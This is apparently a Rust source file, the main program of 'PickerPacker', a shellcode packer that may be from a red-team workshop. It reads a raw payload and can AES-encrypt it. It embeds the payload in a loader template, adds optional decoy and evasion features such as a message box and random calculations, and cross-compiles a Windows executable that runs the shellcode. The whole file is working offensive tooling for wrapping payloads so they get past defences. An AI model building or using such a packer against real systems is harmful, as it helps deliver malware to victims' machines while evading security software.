use std::env;
use std::fs::File;
use std::io::prelude::*;

#[repr(C)]
struct AesCtx {
    round_key: [u8; 240],
    iv: [u8; 16],
}

unsafe extern "C" {
    fn AES_init_ctx_iv(ctx: *mut AesCtx, key: *const u8, iv: *const u8);
    fn AES_CBC_encrypt_buffer(ctx: *mut AesCtx, buf: *mut u8, length: usize);
}

fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
    if hex_str.len() % 2 != 0 {
        return Err("Hex string must have even length".to_string());
    }
    
    let mut bytes = Vec::new();
    for i in (0..hex_str.len()).step_by(2) {
        let byte_str = &hex_str[i..i+2];
        match u8::from_str_radix(byte_str, 16) {
            Ok(byte) => bytes.push(byte),
            Err(_) => return Err(format!("Invalid hex characters: {}", byte_str)),
        }
    }
    Ok(bytes)
}

fn aes_encrypt_payload(raw_data_buffer: &[u8], aes_key: &[u8], aes_iv: &[u8]) -> Option<Vec<u8>> {
    if raw_data_buffer.is_empty() || aes_key.is_empty() || aes_iv.is_empty() {
        return None;
    }

    let mut new_buffer = Vec::from(raw_data_buffer);
    let raw_buffer_size = raw_data_buffer.len();
    let mut new_buffer_size = raw_buffer_size;

    if raw_buffer_size % 16 != 0 {
        new_buffer_size = raw_buffer_size + 16 - (raw_buffer_size % 16);
        new_buffer.resize(new_buffer_size, 0);
    }

    let mut aes_ctx: AesCtx = unsafe { std::mem::zeroed() };
    unsafe {
        AES_init_ctx_iv(&mut aes_ctx, aes_key.as_ptr(), aes_iv.as_ptr());
        AES_CBC_encrypt_buffer(&mut aes_ctx, new_buffer.as_mut_ptr(), new_buffer_size);
    }

    Some(new_buffer)
}

fn main() {

println!(r#"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⢀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⢀⣠⡶⠿⠿⠿⠭⢤⣀⣀⠉⣩⡟⠒⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀ ⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀     ⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⢀⣤⠤⠤⠤⢤⣀⠀⠀
   ⢰⠋⠀⠀⠀⠉⠙⠲⢤⣀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄⢀⡴⠚⠉⠀⠀⠀⠀⠀⠈⢳⡄
   ⢸⡄⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⣧⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡷
   ⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢭⣉⠙⠛⠒⠲⠶⠶⠶⠶⠖⠒⠒⠒⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃
⠀    ⠀⠙⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⢤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀
    ⠀⠀⠀⠀⠈⠙⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⠀⠀⠀
⠀    ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⣤⣤⠤⠤⠤⠤⠤⠤⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

           ██████╗ ██╗ ██████╗██╗  ██╗███████╗██████╗ 
           ██╔══██╗██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
           ██████╔╝██║██║     █████╔╝ █████╗  ██████╔╝
           ██╔═══╝ ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
           ██║     ██║╚██████╗██║  ██╗███████╗██║  ██║
           ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
             ██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
             ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
             ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
             ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
             ██║     ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
             ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    
        ✧･ﾟ:*✧･ﾟ:* Rust-Powered Customizable Packer *:･ﾟ✧*:･ﾟ✧
    
        Created by: Swayam Tejas Padhy (@Leek0gg)
        GitHub: https://github.com/Swayampadhy/PickerPacker

    "#);

    let args: Vec<String> = env::args().collect();

    let mut do_message_box = false;
    let mut do_calculation = false;
    let mut embedded_payload = true;
    let mut do_default_execution = false;
    let mut do_tinyaes = false;
    let mut aes_key = String::new();
    let mut aes_iv = String::new();
    let mut input_file = "".to_string();
    let mut shellcode_file = "".to_string();
    
    /* 

    This way of storing the loader code has advantages and downsides. Storing it on disk would make it much easier for you to maintain the code.
    But you would also need to copy all dependency files to the Payload gen system, so it's a tradeoff.

    For this workshop, faster coding and easier maintenance is better, so you should uncomment the code below and use the one from above.
    Reading comments is important, as it can save you a lot of time and effort. ;-)

    */
    let mut loader_stub = String::new();
    let mut file = File::open("template/template.rs").expect("Unable to open file");
    file.read_to_string(&mut loader_stub).expect("Unable to read file");
    
    // In a long term run, this argument handling will likely suck, escpecially with more and more features. 
    // A library could instead help out here later.
    for i in 0..args.len() {
        match args[i].as_str() {
            "--messageBox" => do_message_box = true,
            "--randomCalculation" => do_calculation = true,
            "--DefaultExecution" => do_default_execution = true,
            "--tinyaes" => do_tinyaes = true,
            "--key" if i < args.len() - 1 => aes_key = args[i + 1].clone(),
            "--iv" if i < args.len() - 1 => aes_iv = args[i + 1].clone(),
            "--shellcodeFile" if i < args.len() - 1 => shellcode_file = args[i + 1].clone(), // file to use for the encrypted payload, this disables embedded feature
            "--input" if i < args.len() - 1 => input_file = args[i + 1].clone(),
            _ => {}
        }
    }

    if shellcode_file != "" {
        embedded_payload = false;
    }

    // If input file is provided, enable default execution by default (can be overridden)
    if input_file != "" && !do_default_execution {
        do_default_execution = true;
    }

    // Validate AES parameters if TinyAES is enabled
    if do_tinyaes {
        if aes_key.is_empty() || aes_iv.is_empty() {
            println!("[-] Error: --tinyaes requires both --key and --iv arguments");
            println!("    Key must be 32 bytes (64 hex characters)");
            println!("    IV must be 16 bytes (32 hex characters)");
            return;
        }
        
        // Validate key length (should be 64 hex characters for 32 bytes)
        if aes_key.len() != 64 {
            println!("[-] Error: AES key must be exactly 64 hex characters (32 bytes)");
            return;
        }
        
        // Validate IV length (should be 32 hex characters for 16 bytes)
        if aes_iv.len() != 32 {
            println!("[-] Error: AES IV must be exactly 32 hex characters (16 bytes)");
            return;
        }
    }

    /* Uncommented, as this is meant to be used as alternative
    let mut loader_stub = String::new();
    loader_stub.push_str(&loader_imports);
    loader_stub.push_str(&loader_rs);
    loader_stub.push_str(&main_close);
    */

    // Final Compiler flags
    let mut compile_command = " build --release ".to_string();
    if do_message_box {
        // TODO: Replace with actual needed feature names and add new ones for each feature you want to use
        compile_command.push_str("--features messagebox ");
    }
    if do_calculation {
        compile_command.push_str("--features calculation ");
    }
    if do_default_execution {
        compile_command.push_str("--features ShellcodeExecuteDefault ");
    }
    if do_tinyaes {
        compile_command.push_str("--features TinyAES ");
    }
    if embedded_payload {
        compile_command.push_str("--features embedded ");
    }
    else
    {
        compile_command.push_str("--features payloadFile ");
    }

    if input_file != "" {
        println!("[*] Input file: {}", input_file);
        // read input_file from disk and overwrite "const ENCPAYLOAD: &[u8] = &[];" from loader_stub with the content of the file
        let mut file = File::open(input_file).expect("Unable to open file");
        let mut data: Vec<u8> = Vec::new();
        file.read_to_end(&mut data).expect("Unable to read file");
        
        // Encrypt content if TinyAES is enabled
        let final_data = if do_tinyaes {
            println!("[*] Encrypting payload with AES-256-CBC");
            let key_bytes = hex_to_bytes(&aes_key).expect("Invalid key format");
            let iv_bytes = hex_to_bytes(&aes_iv).expect("Invalid IV format");
            
            if key_bytes.len() != 32 {
                panic!("Key must be exactly 32 bytes");
            }
            if iv_bytes.len() != 16 {
                panic!("IV must be exactly 16 bytes");
            }
            
            match aes_encrypt_payload(&data, &key_bytes, &iv_bytes) {
                Some(encrypted) => {
                    println!("[+] Payload encrypted successfully ({} bytes)", encrypted.len());
                    println!("[!] IMPORTANT: The final executable will require --key and --iv arguments:");
                    println!("    Usage: PickerPacker.exe --key {} --iv {}", aes_key, aes_iv);
                    encrypted
                }
                None => panic!("Failed to encrypt payload"),
            }
        } else {
            data
        };
        
        // overwrite the content of ENCPAYLOAD with the encrypted data
        if embedded_payload {
            loader_stub = loader_stub.replace("const ENCPAYLOAD: &[u8] = &[];", &format!("const ENCPAYLOAD: &[u8] = &{:?};", final_data));
        }
        else
        {
            println!("[*] Shellcode file: {}", shellcode_file);
            // TODO: If you want to not embed the payload, but toload it from disk or a remote webserver or from somewhere else, "const ENCPAYLOAD: &[u8] = &[];" should be removed completely
            // And a function to load the payload from the desired location should be implemented instead.            
            loader_stub = loader_stub.replace("const ENCPAYLOAD: &[u8] = &[];", "");
            // Than, you should also write the encrypted content to disk, so that the operator (you?) can place it accordingly with the loader before execution.
        }
    }
    else
    {
        println!("Please provide an input file with --input <filename>");
        return;
    }
    
    compile_command.push_str(" --manifest-path ./loader/Cargo.toml");

    // Detect OS and set appropriate compilation target
    #[cfg(target_os = "linux")]
    {
        println!("[*] Detected OS: Linux");
        println!("[*] Cross-compiling for Windows target: x86_64-pc-windows-gnu");
        compile_command.push_str(" --target x86_64-pc-windows-gnu");
    }

    #[cfg(target_os = "windows")]
    {
        println!("[*] Detected OS: Windows");
        println!("[*] Compiling for Windows target: x86_64-pc-windows-msvc");
        compile_command.push_str(" --target x86_64-pc-windows-msvc");
    }

    // create a new subdirectory ./loader - we need to create a new directory for the loader source code plus
    // add a Cargo.toml file to it
    std::fs::create_dir_all("loader").expect("Unable to create directory");
    // create another subdirectors ./loader/src
    std::fs::create_dir_all("loader/src").expect("Unable to create directory");

    // TODO: if you want to create a loader DLL, you need to save the file as loader/src/lib.rs instead of loader/src/main.rs
    // Also make sure to delete old existing files, as otherwise cargo will fail to compile with main.rs and lib.rs being there at the same time.
    let mut file = File::create("./loader/src/main.rs").expect("Unable to create file");
    file.write_all(loader_stub.as_bytes()).expect("Unable to write data");

    // Copy execution.rs to loader/src if default execution is enabled
    if do_default_execution {
        std::fs::copy("./template/execution.rs", "./loader/src/execution.rs").expect("Unable to copy execution.rs");
    }

    // Copy AES-related files if TinyAES is enabled
    if do_tinyaes {
        std::fs::copy("./template/aes.rs", "./loader/src/aes.rs").expect("Unable to copy aes.rs");
        std::fs::copy("./template/TinyAES.c", "./loader/TinyAES.c").expect("Unable to copy TinyAES.c");
        std::fs::copy("./template/build.rs", "./loader/build.rs").expect("Unable to copy build.rs");
    }

    println!("Compile command: {}", compile_command);

    // compile the loader
    let mut path_to_cargo_project = std::env::current_dir().unwrap();
    compiler(&mut path_to_cargo_project, &compile_command).expect("Failed to compile loader");
}

use std::env::set_current_dir;
use std::path::PathBuf;

fn compiler(path_to_cargo_project: &mut PathBuf, compile_command: &String) -> Result<(), Box<dyn std::error::Error>> {
    let path_to_cargo_folder = path_to_cargo_project.clone();
    set_current_dir(&path_to_cargo_folder)?;
    let output = std::process::Command::new("cargo")
        .env("CFLAGS", "-lrt")
        .env("LDFLAGS", "-lrt")
        .env("RUSTFLAGS", "-C target-feature=+crt-static") // without linking here, the payload might not execute on systems where the corresponding DLL is missing
        .env("RUSTFLAGS", "-A warnings")
        .args(compile_command.split_whitespace())
        .output()?;


    println!("stderr: {}", String::from_utf8_lossy(&output.stderr));
    
    if output.status.success() {
        return Ok(());
    }
    else
    {
        println!("[-] Failed to compile!\r\n\r\n");
        let error_message = String::from_utf8_lossy(&output.stderr);
        return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_message.to_string())));
    }
}

